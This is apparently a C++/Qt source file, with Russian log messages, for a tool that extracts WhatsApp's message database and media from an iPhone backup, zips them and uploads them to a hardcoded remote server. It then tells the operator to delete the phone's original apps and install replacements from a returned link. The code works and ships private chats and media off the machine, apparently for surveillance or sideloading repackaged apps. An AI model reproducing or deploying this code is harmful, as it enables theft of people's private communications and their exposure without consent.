#include "vgparserthread.h"


void VGParserThread::run(){

  // process(manifestpath);

    testProcess();




}

void VGParserThread::testProcess(){

   QString uuid =  "e9bdd3562cdccb727e7d41a7051f2b2880388aa8";
   QString path = "C:/Users/vohulg/AppData/Local/Temp/e9bdd3562cdccb727e7d41a7051f2b2880388aa8/wmedia.zip";
   sendZip(path, uuid);






}

void VGParserThread::setValues(QString manifestpathIn, QString UUIDIn, QSqlDatabase dbIn, QString currentBackupIn, QByteArray GuidByteArrIn, QByteArray URLByteArrIn)
{
    manifestpath = manifestpathIn;
    UUID = UUIDIn;
    db = dbIn;
    currentBackup = currentBackupIn;
    GuidByteArr = GuidByteArrIn;
    URLByteArr = URLByteArrIn;

    WHATSAPP_DB_FILENAME = "ChatStorage.sqlite";
     WHATSAPP_MEDIA_ZIP_FILENAME = "wmedia.zip";
     WHATSAPP_MEDIA_ZIP_POST_NAME = "wzipfile";
     WHATSAPP_DB_POST_NAME = "wdbfile";
     IPA_BUILDER_MAC_SERVER_IP = "http://88.204.154.151";

}


bool VGParserThread::process(QString backupFullPath){

   // logTextBrowser->append("\nОбработка бэкапа.........");
    emit changeLog("\nОбработка бэкапа........." );

    connectDatabase(backupFullPath);

    //clear all tmpDir
    clear();

    //move ChatStorage.sqlite path
    emit changeLog("\nИдет копирование базы данных в временную диреторию.........");
    copyStorageFile();

    // move media files
   emit changeLog("\nКопирование медиа файлов в временную диреторию.........");
    QMap <QString, QString> *mapIosPathAndLocalPath =new QMap<QString, QString>();
    getMediaFilesPaths(mapIosPathAndLocalPath);
    copyFilesToTmpDir(mapIosPathAndLocalPath);

    //zip file for whatsapp
    emit changeLog("\nСоздание архива .........\n");
    QString zippedPath = zip(WHATSAPP_MEDIA_ZIP_FILENAME);
    if(zippedPath.isEmpty()){
        qDebug() << "faild zip file";
        return false;
    }

     //send ziped file to server
    emit changeLog("\nОтправка архива на сервер.........\n");
    sendZip(zippedPath, UUID);

    return true;
}

bool VGParserThread::connectDatabase(const QString& database)
{

     db =  QSqlDatabase::addDatabase("QSQLITE");
     db.setDatabaseName(database);

    bool  res = db.open();
     if (!res){
         qDebug() << "database not opened";
         return false;
     }
     else{
         qDebug() << "database sucsses opened";
        emit changeLog("Манифест файл успешно считался");
        // db.close();

     }
     return true;
}

bool VGParserThread::copyStorageFile(){

    QSqlQuery query(db);
    QString cmd = "select * from files where relativePath = 'ChatStorage.sqlite'";

    bool success = query.exec(cmd);
    if (!success){
         qDebug() << "faild select";
         return false;
    }

    if(query.next())
    {
         QString hash = query.value(0).toString();
         QString iosFileName = query.value(2).toString();
         QDirIterator dirIter(currentBackup, QStringList() << hash, QDir::Files, QDirIterator::Subdirectories);
         if(dirIter.hasNext()){
             QString localPath = dirIter.next();
             //copy
             QString tempDirPath = getBackupTmpDirFullPath();
             if(tempDirPath.isEmpty()){
                 qDebug() << "faild create tmpDir";
                 return false;
             }
             QString srcFilePAth = localPath;
             QString dstFilePath = QString("%1/%2").arg(tempDirPath,iosFileName );
             QFile file;
             bool isCopiedSuccess =  file.copy(srcFilePAth, dstFilePath);

            if(!isCopiedSuccess){
                qDebug() << "faild copy file from src path: " << srcFilePAth << " toPath: " << dstFilePath;
                return false;
            }
         }
    }


    return true;
}

bool VGParserThread::getMediaFilesPaths( QMap <QString, QString>* mapIosPathAndLocalPath){
    //1 Get media files paths
    QSqlQuery query(db);
    QString cmd = "select * from files where domain LIKE \"%AppDomain-net.whatsapp.WhatsApp%\" AND relativePath LIKE \"%Library/Media%\" AND flags = 1";

    bool success = query.exec(cmd);
    if (!success){
         qDebug() << "faild select";
         return false;
    }

    QMap <QString, QString> mapHashPath;

    int countRowInDb = 0;
    while(query.next())
    {
        QString hash = query.value(0).toString();
        QString pathInIOS = query.value(2).toString();
        mapHashPath.insert(hash,pathInIOS);
        countRowInDb++;
    }


    QMapIterator<QString, QString> iter(mapHashPath);
    qint64 countFind = 0;
    while (iter.hasNext()) {
        iter.next();
        qDebug() << iter.key() << ": " << iter.value() << endl;
        QDirIterator dirIter(currentBackup, QStringList() << iter.key(), QDir::Files, QDirIterator::Subdirectories);
        while(dirIter.hasNext()){
            mapIosPathAndLocalPath->insert(iter.value(),dirIter.next() );
        }

        qDebug() << "count of find loop:" << countFind;
        qDebug() << "current size of finded map is:" << mapIosPathAndLocalPath->count();
        countFind++;

        //for test
#ifdef TEST
        if(countFind > 5){
            break;
        }
#endif
    }

    qDebug() << "Finished Count of finded files is:" << mapIosPathAndLocalPath->count();
    return true;
}

bool VGParserThread::copyFilesToTmpDir (QMap <QString, QString>* mapIosPathAndLocalPath){

    // get tmp dir

    QString tempDirPath = getBackupTmpDirFullPath();
    if(tempDirPath.isEmpty()){
        qDebug() << "faild create tmpDir";
        return false;
    }

    QMapIterator<QString, QString> iter(*mapIosPathAndLocalPath);

    while (iter.hasNext()) {

        iter.next();
        //Library/Media/77017213945-1409280046@g.us/2/2/220f0a3e-a074-4ade-b2f2-2631be0f5a11.thumb
        QString iosPath  = iter.key();

        //"C:/Users/Admin/AppData/Roaming/Apple Computer/MobileSync/Backup/1b5b94b83e762264209e8482ff965434f0dcd1ab/00/0095d94891ca2b7c2754fe234854b2e34807b57a"
        QString localPath = iter.value();

        qDebug() << iosPath << ":" << localPath;

        //cut from iosPath Library/
        QString fileName = QFileInfo(iosPath).fileName();
        iosPath = iosPath.remove(0,8);
        iosPath = iosPath.replace(fileName, "");

        QString pathWithAllDirs = QString("%1/%2").arg(tempDirPath,iosPath );

        QDir dirForMedia(pathWithAllDirs);

        if(!dirForMedia.exists()){
            bool succes = dirForMedia.mkpath(pathWithAllDirs);
            if(!succes){
                qDebug() << "faild to create folder with path:" << pathWithAllDirs;
            }

        }

        //copy
        QString srcFilePAth = localPath;
        QString dstFilePath = QString("%1%2").arg(pathWithAllDirs,fileName );

        QFile file;

       bool isCopiedSuccess =  file.copy(srcFilePAth, dstFilePath);

       if(!isCopiedSuccess){
           qDebug() << "faild copy file from src path: " << srcFilePAth << " toPath: " << dstFilePath;
       }

    }

    return true;

}

QString VGParserThread::zip(QString zipFileName){

    //"%ProgamFiles%\WinRAR\Rar.exe" a -ep1 -r "Name of ZIP file with path" "%UserProfile%\Desktop\someFolder"
   // rar a backup @backup.lst

    QProcess* zipProc = new QProcess(this);
    QString cmd = getWinRarExePath();
    if (cmd.isEmpty()){
        qDebug() << "faild get rar.exe path";
        return "";
    }

    QString zippedFileName = QString("%1/%2").arg(getBackupTmpDirFullPath(),zipFileName);

    QStringList argZip;
    argZip << "a" << "-afzip" << "-ep1" << zippedFileName << QString("@%1").arg(getLstFile());
    zipProc->start(cmd, argZip);

    if (!zipProc->waitForFinished())
        return "";

    QByteArray zipResult = zipProc->readAll();

    qDebug() << "zip result:" << zipResult;

    return zippedFileName;

}

QString VGParserThread::getLstFile(){

    QString lstFilePath =  QString("%1/%2.lst").arg(QDir::tempPath(),UUID);
        QFile fileLst(lstFilePath);
        if (!fileLst.open(QIODevice::WriteOnly)){
            return "";
        }
        QTextStream out(&fileLst);
           // out << "The magic number is: " << 49 << "\n";


        QDir backupDir(getBackupTmpDirFullPath());
        QStringList list =  backupDir.entryList();

        foreach(QString dirName,list){
            if(dirName == "." || dirName == ".."){
                continue;
            }

            //write to lst file
            QString fullPath = QString("%1/%2").arg(getBackupTmpDirFullPath(), dirName);
            if(fullPath.contains(WHATSAPP_DB_FILENAME)){
                continue;
            }
            out << fullPath << "\n";

        }

        fileLst.close();
        return lstFilePath;




}

bool VGParserThread::clear(){

    QString lstFile = QString("%1/%1.lst").arg(QDir::tempPath(), UUID);
    if (QFile::exists(lstFile)){
        QFile::remove(lstFile);
    }

    QString tmpDirForUUID = QString("%1/%1").arg(QDir::tempPath(), UUID);
    QDir dir;
    if (dir.exists(tmpDirForUUID)){
        dir.remove(tmpDirForUUID);
    }

    return true;

}

QString  VGParserThread::getWinRarExePath(){

    //QString winrarExe = "C:\\Program Files\\WinRAR\\Rar.exe";
    QString winrarExe = "C:\\Program Files\\WinRAR\\WinRAR.exe";

    QFile file(winrarExe);

    if(file.exists()){

        return winrarExe;
    }
    else{
        return "";
    }

}

QString VGParserThread::getBackupTmpDirFullPath (){

    QString tempDirPath = QString("%1/%2").arg(QDir::tempPath(), UUID);
    QDir tmpDir(tempDirPath);

    if(!tmpDir.exists()){
        bool isSuccess = tmpDir.mkdir(tempDirPath);
        if(!isSuccess){
            qDebug() << "faild create temp folder at path" << tempDirPath;
           return "";
        }

    }

    return tempDirPath;

}

QString VGParserThread::getNameFromFullPath(QString fullPath){

    QFile file(fullPath);
    QString str = file.fileName();
    QStringList parts = str.split("/");
    QString lastSection = parts.at(parts.size()-1);
    return lastSection;

}

/*
bool VGParserThread::sendZip (QString zipFullPath, QString uuid){

    QString fileName = getNameFromFullPath(zipFullPath);

    QFile file(zipFullPath);
    if (!file.open(QIODevice::ReadWrite))
        return false;

    QNetworkAccessManager *manager =  new QNetworkAccessManager(this);;
    //параметр 1 - uuid, параметр 2 - файл параметр 3 - guid
    QByteArray param1Name="uuid" ,param1Value=uuid.toUtf8();
    QByteArray  param1ContentType="text/plain";

    QByteArray param3Name="guid" ,param3Value=GuidByteArr;
    QByteArray  param3ContentType="text/plain";

    QByteArray paramNameUrl="url" ,paramUrlValue=URLByteArr;
    QByteArray  paramUrlContentType="text/plain";

    QByteArray param2Name="wzipfile", param2FileName=fileName.toUtf8();
    QByteArray  param2ContentType="application/octet-stream";
    QByteArray param2Data=file.readAll();

    //задаем разделитель
    QByteArray postData,boundary="-----------------------1BEF0A57BE110FD467A";

    // параметр uuid
    postData.append("--"+boundary+"\r\n");//разделитель
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param1Name);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(param1Value);
    postData.append("\r\n");

    // параметр guid
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param3Name);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(param3Value);
    postData.append("\r\n");

    // параметр url
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(paramNameUrl);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(paramUrlValue);
    postData.append("\r\n");

    //параметр 2 - файл
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param2Name);
    //имя файла
    postData.append("\"; filename=\"");
    postData.append(param2FileName);
    postData.append("\"\r\n");
    //тип содержимого файла
    postData.append("Content-Type: "+param2ContentType+"\r\n\r\n");
    //данные
    postData.append(param2Data);
    postData.append("\r\n");
    //"хвост" запроса
    postData.append("--"+boundary+"--\r\n");

    QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
    request.setHeader(QNetworkRequest::ContentTypeHeader,
        "multipart/form-data; boundary="+boundary);
    request.setHeader(QNetworkRequest::ContentLengthHeader,
        QByteArray::number(postData.length()));

    connect(manager, SIGNAL(finished(QNetworkReply*)),this, SLOT(sendReportToServerReply(QNetworkReply*)));
     //connect(manager, SIGNAL(),this, SLOT();

   emit changeLog("Идет отправка архива на сервер......");
    QNetworkReply *reply=manager->post(request,postData);


    return true;
}

*/
//uuid e9bdd3562cdccb727e7d41a7051f2b2880388aa8
bool VGParserThread::sendZip (QString zipFullPath, QString uuid){ //C:/Users/vohulg/AppData/Local/Temp/e9bdd3562cdccb727e7d41a7051f2b2880388aa8/whatsapp.zip

    QString fileName = getNameFromFullPath(zipFullPath);

    QFile file(zipFullPath);
    if (!file.open(QIODevice::ReadWrite)){
         emit changeLog(QString(" Не найден файл с медиа архивом: %1 ").arg(zipFullPath));
        return false;
    }

     QByteArray postDataTest;
     postDataTest.reserve(file.size());
     postDataTest = file.readLine();

    QString dbFileNameFullPath = zipFullPath;
    QString dbFileName = WHATSAPP_DB_FILENAME;
    dbFileNameFullPath.replace(WHATSAPP_MEDIA_ZIP_FILENAME, WHATSAPP_DB_FILENAME);
     dbFileNameFullPath.replace("whatsapp.zip", WHATSAPP_DB_FILENAME);

    QFile dbFileFd(dbFileNameFullPath);
    if (!dbFileFd.open(QIODevice::ReadWrite)){
         emit changeLog(QString(" Не найден файл с  архивом базы данных : %1 ").arg(dbFileNameFullPath));
        return false;
    }

    QNetworkAccessManager *manager =  new QNetworkAccessManager(this);;
    //параметр 1 - uuid, параметр 2 - файл параметр 3 - guid
    QByteArray param1Name="uuid" ,param1Value=uuid.toUtf8();
    QByteArray  param1ContentType="text/plain";

    QByteArray param3Name="guid" ,param3Value=GuidByteArr;
    QByteArray  param3ContentType="text/plain";

    QByteArray paramNameUrl="url" ,paramUrlValue=URLByteArr;
    QByteArray  paramUrlContentType="text/plain";

    QByteArray param2Name=WHATSAPP_MEDIA_ZIP_POST_NAME.toUtf8(), param2FileName=fileName.toUtf8();
    QByteArray  param2ContentType="application/octet-stream";
    QByteArray param2Data=file.readAll();

    QByteArray param4Name=WHATSAPP_DB_POST_NAME.toUtf8(), param4FileName=dbFileName.toUtf8();
    QByteArray  param4ContentType="application/octet-stream";
    QByteArray param4Data=dbFileFd.readAll();

    //задаем разделитель
    QByteArray boundary="-----------------------1BEF0A57BE110FD467A";
    QByteArray postData;


    // параметр uuid
    postData.append("--"+boundary+"\r\n");//разделитель
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param1Name);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(param1Value);
    postData.append("\r\n");

    // параметр guid
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param3Name);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(param3Value);
    postData.append("\r\n");

    // параметр url
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(paramNameUrl);
    postData.append("\"\r\n\r\n");
    //значение параметра
    postData.append(paramUrlValue);
    postData.append("\r\n");

    //параметр 4 - файл базы данных
    postData.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData.append("Content-Disposition: form-data; name=\"");
    postData.append(param4Name);
    //имя файла
    postData.append("\"; filename=\"");
    postData.append(param4FileName);
    postData.append("\"\r\n");
    //тип содержимого файла
    postData.append("Content-Type: "+param4ContentType+"\r\n\r\n");
    //данные
    //postData.reserve(postData->size() + param4Data.size());
    postData.append(param4Data);
    //postData.reserve(postData->size() + QByteArray("\r\n").size());
    postData.append("\r\n");

    //параметр 2 - файл архив медиа

    QByteArray tmp  ;

    tmp.append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    tmp.append("Content-Disposition: form-data; name=\"");
    tmp.append(param2Name);
    //имя файла
    tmp.append("\"; filename=\"");
    tmp.append(param2FileName);
    tmp.append("\"\r\n");
    //тип содержимого файла
    tmp.append("Content-Type: "+param2ContentType+"\r\n\r\n");

    //postData.reserve(postData.size() + tmp.size() + param2Data.size() + QByteArray("\r\n").size() + QByteArray("--"+boundary+"--\r\n").size());
    postData.append(tmp);

    //данные
    //postData->reserve(postData->size() + param2Data.size());
    postData.append(param2Data);
   // postData->reserve(postData->size() + QByteArray("\r\n").size());
    postData.append("\r\n");

    //"хвост" запроса
    postData.append("--"+boundary+"--\r\n");

    QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
    request.setHeader(QNetworkRequest::ContentTypeHeader,
        "multipart/form-data; boundary="+boundary);
    request.setHeader(QNetworkRequest::ContentLengthHeader,
        QByteArray::number(postData.length()));

    connect(manager, SIGNAL(finished(QNetworkReply*)),this, SLOT(sendReportToServerReply(QNetworkReply*)));
     //connect(manager, SIGNAL(),this, SLOT();

   emit changeLog("Идет отправка архива на сервер......");
    QNetworkReply *reply=manager->post(request, postData);


    return true;
}

/*
bool VGParserThread::sendZip (QString zipFullPath, QString uuid){

    QString fileName = getNameFromFullPath(zipFullPath);

    QFile file(zipFullPath);
    if (!file.open(QIODevice::ReadWrite)){
         emit changeLog(QString(" Не найден файл с медиа архивом: %1 ").arg(zipFullPath));
        return false;
    }

    QString dbFileNameFullPath = zipFullPath;
    QString dbFileName = WHATSAPP_DB_FILENAME;
    dbFileNameFullPath.replace(WHATSAPP_MEDIA_ZIP_FILENAME, WHATSAPP_DB_FILENAME);

    QFile dbFileFd(dbFileNameFullPath);
    if (!dbFileFd.open(QIODevice::ReadWrite)){
         emit changeLog(QString(" Не найден файл с  архивом базы данных : %1 ").arg(dbFileNameFullPath));
        return false;
    }

    QNetworkAccessManager *manager =  new QNetworkAccessManager(this);;
    //параметр 1 - uuid, параметр 2 - файл параметр 3 - guid
    QByteArray param1Name="uuid" ,param1Value=uuid.toUtf8();
    QByteArray  param1ContentType="text/plain";

    QByteArray param3Name="guid" ,param3Value=GuidByteArr;
    QByteArray  param3ContentType="text/plain";

    QByteArray paramNameUrl="url" ,paramUrlValue=URLByteArr;
    QByteArray  paramUrlContentType="text/plain";

    QByteArray param2Name=WHATSAPP_MEDIA_ZIP_POST_NAME.toUtf8(), param2FileName=fileName.toUtf8();
    QByteArray  param2ContentType="application/octet-stream";
    QByteArray param2Data=file.readAll();

    QByteArray param4Name=WHATSAPP_DB_POST_NAME.toUtf8(), param4FileName=dbFileName.toUtf8();
    QByteArray  param4ContentType="application/octet-stream";
    QByteArray param4Data=dbFileFd.readAll();

    //задаем разделитель
    QByteArray boundary="-----------------------1BEF0A57BE110FD467A";
    QByteArray* postData = new QByteArray();

    // параметр uuid
    postData->append("--"+boundary+"\r\n");//разделитель
    postData->append("Content-Disposition: form-data; name=\"");
    postData->append(param1Name);
    postData->append("\"\r\n\r\n");
    //значение параметра
    postData->append(param1Value);
    postData->append("\r\n");

    // параметр guid
    postData->append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData->append("Content-Disposition: form-data; name=\"");
    postData->append(param3Name);
    postData->append("\"\r\n\r\n");
    //значение параметра
    postData->append(param3Value);
    postData->append("\r\n");

    // параметр url
    postData->append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData->append("Content-Disposition: form-data; name=\"");
    postData->append(paramNameUrl);
    postData->append("\"\r\n\r\n");
    //значение параметра
    postData->append(paramUrlValue);
    postData->append("\r\n");

    //параметр 2 - файл
    postData->append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData->append("Content-Disposition: form-data; name=\"");
    postData->append(param2Name);
    //имя файла
    postData->append("\"; filename=\"");
    postData->append(param2FileName);
    postData->append("\"\r\n");
    //тип содержимого файла
    postData->append("Content-Type: "+param2ContentType+"\r\n\r\n");
    //данные
    postData->append(param2Data);
    postData->append("\r\n");

    //параметр 4 - файл базы данных
    postData->append("--"+boundary+"\r\n");//разделитель
    //имя параметра
    postData->append("Content-Disposition: form-data; name=\"");
    postData->append(param4Name);
    //имя файла
    postData->append("\"; filename=\"");
    postData->append(param4FileName);
    postData->append("\"\r\n");
    //тип содержимого файла
    postData->append("Content-Type: "+param4ContentType+"\r\n\r\n");
    //данные
    postData->append(param4Data);
    postData->append("\r\n");


    //"хвост" запроса
    postData->append("--"+boundary+"--\r\n");

    QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
    request.setHeader(QNetworkRequest::ContentTypeHeader,
        "multipart/form-data; boundary="+boundary);
    request.setHeader(QNetworkRequest::ContentLengthHeader,
        QByteArray::number(postData->length()));

    connect(manager, SIGNAL(finished(QNetworkReply*)),this, SLOT(sendReportToServerReply(QNetworkReply*)));
     //connect(manager, SIGNAL(),this, SLOT();

   emit changeLog("Идет отправка архива на сервер......");
    QNetworkReply *reply=manager->post(request,*postData);


    return true;
}

*/
void VGParserThread::sendReportToServerReply(QNetworkReply* reply){

     QByteArray replyInByte = reply->readAll();
     qint64 size = replyInByte.size();

      if(replyInByte.size() < SIZE_UNIQ_URL || replyInByte.contains("ERROR")){
         emit changeLog("Ошибка в передаче архива на сервер:");
          emit changeLog(QString::fromLatin1(replyInByte));
          return;
     }

     QString replyStr = QString::fromLatin1(replyInByte);
     QString log = QString("\nДля установки программ на телефон сначала удалите оригинальные приложения затем откройте браузер на телефоне и перейдите по ссылки https://vohulg.ru/ios/%1 \n").arg(replyStr);
    emit changeLog(log);

     // сохранение UUID в файл на рабочем столе и отправка на почту
     QString fullPath = QString("%1/Desktop/%2.log").arg(QDir::homePath(), UUID);
     QDateTime currentDT =  QDateTime::currentDateTime();
     QString dateTimeStr = currentDT.toString("dd.MM.yyyy_hh.mm.ss");
     QString pathWithDate = QString("%1_%2").arg(fullPath,dateTimeStr);

     emit saveLogSig(pathWithDate);



 }

void VGParserThread::sendPost(){

    //QUrl serviceUrl = QUrl("http://myserver/myservice.asmx");
     QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));
     QByteArray postData;
     postData.append("uuid=925dsfh90325793fdsif0932878fdoisf");

      /*
      Setup the post data somehow
      I want to transmit:
      param1=string,
      param2=string
      */

       // Call the webservice
       QNetworkAccessManager *networkManager = new QNetworkAccessManager(this);
       connect(networkManager, SIGNAL(finished(QNetworkReply*)), this, SLOT(sendReportToServerReply(QNetworkReply*)));
       networkManager->post(request, postData);
}

void  VGParserThread::sendMultiPart(){

   // QString zipFile = "C:\\Users\\vohulg\\AppData\\Local\\Temp\\6f3f394f07f8edd922b701fc3db69ede00bb5360\\whatsapp.zip";
    QString zipFile = "C:\\Users\\vohulg\\AppData\\Local\\Temp\\6f3f394f07f8edd922b701fc3db69ede00bb5360\\Samples.cpp";


    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
        QHttpPart imagePart;
        imagePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"wzipfile\"; filename=\"sample\""));/* version.tkt is the name on my Disk of the file that I want to upload */

        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
        textPart.setBody("92874fhdsfh932744545454rwyri");/* toto is the name I give to my file in the server */

        QFile *file = new QFile(zipFile);
        file->open(QIODevice::ReadOnly);
        imagePart.setBodyDevice(file);
        file->setParent(multiPart); // we cannot delete the file now, so delete it with the multiPart

        multiPart->append(textPart);
        multiPart->append(imagePart);

       QNetworkRequest request(QUrl("http://88.204.154.151/in.php"));

        QNetworkAccessManager *networkManager= new QNetworkAccessManager;
        networkManager->post(request, multiPart);
       // multiPart->setParent(reply); // delete the multiPart with the reply


}


